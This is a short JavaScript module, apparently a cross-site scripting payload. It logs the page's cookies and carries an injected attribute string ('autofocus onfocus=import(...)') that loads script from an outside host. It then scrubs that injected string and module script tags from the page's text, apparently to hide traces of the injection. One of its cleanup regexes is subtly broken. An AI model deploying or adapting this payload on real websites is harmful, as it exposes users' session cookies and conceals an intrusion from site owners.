console.log('selam');
console.log(document.cookie);
  
(function() {
  const zararliMetin = `"autofocus onfocus=import('https://abbb.3d.tc/a.js');`;

  function temizleMetinNode(node) {
    if(node.nodeType === Node.TEXT_NODE) {
      node.nodeValue = node.nodeValue.replaceAll(zararliMetin, '');
      node.nodeValue = node.nodeValue.replace(/<script\s+type=module\s+src=[^"']><\/script>/gi, '');
    } else {
      node.childNodes.forEach(temizleMetinNode);
    }
  }

  temizleMetinNode(document.body);
})();

;

export {};
